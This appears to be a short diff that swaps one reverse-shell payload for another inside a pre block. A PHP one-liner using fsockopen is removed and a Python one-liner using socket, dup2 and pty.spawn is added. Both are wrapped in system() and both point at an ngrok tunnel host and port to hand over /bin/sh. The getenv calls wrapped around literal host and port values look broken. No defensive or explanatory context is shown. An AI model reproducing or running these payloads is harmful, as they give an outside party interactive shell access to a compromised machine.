@@ -1,1 +1,4 @@
-<pre>system('php -r '$sock=fsockopen(getenv("tcp://7.tcp.eu.ngrok.io"),getenv("16840"));exec("/bin/sh -i <&3 >&3 2>&3");'')</pre>
+<pre>system('python -c 'import sys,socket,os,pty;s=socket.socket()
+s.connect((os.getenv("tcp://7.tcp.eu.ngrok.io"),int(os.getenv("16840"))))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")'')</pre>
